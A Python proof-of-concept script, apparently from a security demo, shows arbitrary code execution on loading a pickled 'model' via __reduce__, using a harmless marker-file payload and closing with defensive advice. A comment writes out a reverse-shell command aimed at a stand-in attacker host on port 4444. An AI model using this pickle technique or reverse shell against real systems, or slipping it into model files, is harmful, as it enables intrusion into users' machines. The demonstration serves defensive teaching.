#!/usr/bin/env python3
"""
Demo 1, Act 2 — The "Trojan model": arbitrary code execution on model LOAD.

OWASP LLM03:2025 (Supply Chain). A huge fraction of models on public hubs are
Python *pickle* files (.bin / .pt / .ckpt). pickle is not a data format — it is
a mini programming language. During `pickle.load()`, Python calls the object's
__reduce__ method, which can return ANY callable + args. So merely *loading*
a downloaded model can run code. No inference required. The model "works"
perfectly afterwards, so nothing looks wrong.

This is exactly how the 100+ malicious models JFrog found on Hugging Face
worked, and how the "nullifAI" evasion (Feb 2025) slipped past scanners.

This PoC uses a HARMLESS payload: it writes a marker file and prints a banner.
In a real attack that same slot is a reverse shell into your production VPC.

Run:  python3 malicious_pickle_poc.py
"""
import os
import pickle
import tempfile


class TrojanModel:
    """Looks like an innocent model object. Isn't."""

    def __init__(self):
        self.name = "sentiment-classifier-v2"     # plausible, benign-looking
        self.weights = [0.1, 0.2, 0.3]

    def __reduce__(self):
        # Whatever this returns is EXECUTED at unpickle time.
        # Real malware puts a reverse shell here:
        #   ("/bin/sh","-c","bash -i >& /dev/tcp/attacker/4444 0>&1")
        # We use a safe stand-in so this demo can't hurt anyone.
        marker = os.path.join(tempfile.gettempdir(), "PWNED_by_model_load.txt")
        cmd = (
            f'echo "[!!!] code executed during pickle.load() — '
            f'this could be a reverse shell" && '
            f'echo "attacker was here @ $(date)" > "{marker}"'
        )
        return (os.system, (cmd,))


def build_trojan(path: str) -> None:
    with open(path, "wb") as f:
        pickle.dump(TrojanModel(), f)
    print(f"[builder] wrote a poisoned 'model' to {path}")


def victim_loads_model(path: str):
    print("[victim ] downloaded a nice model from a hub, loading it...")
    with open(path, "rb") as f:
        model = pickle.load(f)      # <— the entire exploit is this one line
    # No exception was raised: from the victim's point of view the load "worked".
    # The malicious code already ran DURING load, before this line prints.
    print("[victim ] load returned with no error — nothing looks wrong.")
    return model


if __name__ == "__main__":
    model_path = os.path.join(tempfile.gettempdir(), "sentiment-classifier-v2.bin")
    print("=" * 68)
    print(" OWASP LLM03 — arbitrary code execution via a pickled model")
    print("=" * 68)
    build_trojan(model_path)
    print("-" * 68)
    victim_loads_model(model_path)
    print("-" * 68)
    marker = os.path.join(tempfile.gettempdir(), "PWNED_by_model_load.txt")
    if os.path.exists(marker):
        print(f"[proof  ] payload ran. Evidence dropped at: {marker}")
        with open(marker) as fh:
            print(f"[proof  ] contents: {fh.read().strip()}")
    print("\nFix: never load untrusted pickle. Use safetensors (see next script),")
    print("     verify signatures (cosign/Sigstore), and load models sandboxed.")
